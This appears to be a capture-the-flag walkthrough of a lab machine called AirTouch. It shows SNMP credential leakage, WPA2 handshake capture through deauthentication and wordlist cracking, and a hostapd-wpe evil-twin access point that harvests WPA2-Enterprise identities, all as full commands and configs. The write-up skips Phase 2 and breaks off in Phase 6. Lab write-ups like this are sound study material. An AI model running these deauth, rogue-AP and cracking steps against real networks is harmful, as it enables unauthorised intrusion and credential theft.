Phase 1 — Initial Access (Consultant Container)

SNMP Enumeration

The target exposes SNMP on the default community string public. Walking the MIB tree reveals the Consultant SSH password embedded in the system description field:

bash
snmpwalk -v2c -c public 10.129.244.98 1.3.6.1.2.1.1.1.0
output
iso.3.6.1.2.1.1.1.0 = STRING: "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
✓  Credentials leaked in SNMP sysDescr: consultant : RxBlZhLmOkacNWScmZ6D
SSH to Consultant Container
bash
ssh consultant@10.129.244.98
# Password: RxBlZhLmOkacNWScmZ6D

Phase 3 — AirTouch-Internet (WPA2-PSK)

Capture & Crack the WPA Handshake

A connected client (28:6C:07:FE:A3:22) is associated with AirTouch-Internet. Deauthenticating it forces a WPA4-way handshake during reconnection:

bash
# Start capture on channel 6, filtering by target BSSID
sudo airodump-ng wlan2 -c 6 --bssid F0:9F:C2:A3:F1:A7 -w /tmp/internet_cap &

# Deauthenticate the connected client
sudo aireplay-ng -0 5 -a F0:9F:C2:A3:F1:A7 -c 28:6C:07:FE:A3:22 wlan2

# Crack the captured handshake
aircrack-ng /tmp/internet_cap-01.cap -w /usr/share/wordlists/rockyou.txt
✓  PSK cracked: challenge
Connect to AirTouch-Internet
bash
cat > /tmp/wpa_internet.conf << 'EOF'
ctrl_interface=/var/run/wpa_supplicant_internet
p2p_disabled=1
network={
    ssid="AirTouch-Internet"
    psk="challenge"
    key_mgmt=WPA-PSK
}
EOF

sudo wpa_supplicant -i wlan1 -c /tmp/wpa_internet.conf -B
sudo dhclient wlan1
ℹ  IP obtained on 192.168.3.0/24 — access to PSK Router at 192.168.3.1.

Phase 4 — AirTouch-Office (WPA2-Enterprise Evil Twin)

WPA2-Enterprise EAP Identity Leak
PEAP Phase 1 Exposes Domain Identity Before Certificate Validation
In WPA2-Enterprise with PEAP/MSCHAPv2, the client sends its EAP Identity in plaintext during Phase 1 — before TLS is established and before certificate verification. An Evil Twin AP captures this identity even when the client ultimately rejects the rogue certificate, leaking the domain-prefixed username.
hostapd-wpe Evil Twin Setup

The Consultant container lacks hostapd-wpe. The binary and all shared libraries are bundled from Kali and transferred:

bash — kali
# Bundle hostapd-wpe with all required shared libraries
mkdir -p /tmp/hwpe_bundle/lib
cp /usr/sbin/hostapd-wpe /tmp/hwpe_bundle/
ldd /usr/sbin/hostapd-wpe | awk '{print $3}' | xargs -I{} cp {} /tmp/hwpe_bundle/lib/
cp /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /tmp/hwpe_bundle/lib/
cp -r /etc/hostapd-wpe/certs /tmp/hwpe_bundle/
cp /etc/hostapd-wpe/hostapd-wpe.eap_user /tmp/hwpe_bundle/

# Transfer bundle to Consultant container
scp -r /tmp/hwpe_bundle consultant@10.129.244.98:/tmp/

Configure and launch the Evil Twin on channel 44 (5GHz) matching AirTouch-Office:

bash — consultant container
cat > /tmp/evil_twin.conf << 'EOF'
interface=wlan3
driver=nl80211
hw_mode=a
channel=44
ssid=AirTouch-Office
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/tmp/hwpe_bundle/hostapd-wpe.eap_user
ca_cert=/tmp/hwpe_bundle/certs/ca.pem
server_cert=/tmp/hwpe_bundle/certs/server.pem
private_key=/tmp/hwpe_bundle/certs/server.key
private_key_passwd=whatever
dh_file=/tmp/hwpe_bundle/certs/dh
wpe_logfile=/tmp/hostapd-wpe.log
EOF

# Run with bundled libraries (no system-wide installation needed)
/tmp/hwpe_bundle/lib/ld-linux-x86-64.so.2 \
  --library-path /tmp/hwpe_bundle/lib \
  /tmp/hwpe_bundle/hostapd-wpe /tmp/evil_twin.conf

Deauthenticate the real client to force reconnection to our Evil Twin:

bash
sudo aireplay-ng -0 10 -a AC:8B:A9:F3:A1:13 wlan2
EAP Identity Capture

When the client associates with the Evil Twin, the Phase 1 EAP exchange reveals the domain-prefixed identity in the hostapd-wpe log before TLS certificate verification occurs:

output — /tmp/hostapd-wpe.log
EAP Identity: AirTouch\r4ulcl
⚠  Critical: the identity includes the domain prefix AirTouch\ — required for successful authentication. The password laboratory is obtained from the EAP user file or MSCHAPv2 hash cracking.
Connecting to AirTouch-Office
bash
cat > /tmp/wpa_office.conf << 'EOF'
ctrl_interface=DIR=/var/run/wpa_supplicant_office
ap_scan=1
network={
    ssid="AirTouch-Office"
    scan_ssid=1
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\r4ulcl"
    password="laboratory"
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"
}
EOF

sudo wpa_supplicant -i wlan0 -c /tmp/wpa_office.conf -B
sudo dhclient wlan0
ℹ  IP obtained on 10.10.10.0/24 corporate network (e.g. 10.10.10.19) — access to Management Host at 10.10.10.1.

Phase 5 — Root Flag (Management Host)

Credential Discovery via send_certs.sh

The PSK Router contains a maintenance script at /root/send_certs.sh that hardcodes the Management Host SSH credentials:

bash — /root/send_certs.sh (on PSK Router)
#!/bin/bash
# Script to sync certs-backup folder to AirTouch-office.
REMOTE_USER="remote"
REMOTE_PASSWORD="xGgWEwqUpfoOVsLeROeG"
REMOTE_PATH="~/certs-backup/"
LOCAL_FOLDER="/root/certs-backup/"

sshpass -p "$REMOTE_PASSWORD" scp -r "$LOCAL_FOLDER" "$REMOTE_USER@10.10.10.1:$REMOTE_PATH"
✓  Management Host SSH credentials: remote : xGgWEwqUpfoOVsLeROeG
SSH to Management Host & EAP User Database
bash
ssh remote@10.10.10.1
# Password: xGgWEwqUpfoOVsLeROeG

The Management Host runs hostapd_wpe for the AirTouch-Office enterprise WiFi. The EAP user database stores plaintext credentials:

bash
cat /etc/hostapd/hostapd_wpe.eap_user

Phase 6 — User Flag (PSK Router)

The PSK Router at 192.168.3.1 accepts SSH connections on the user account with any password — a misconfigured authentication mechanism:
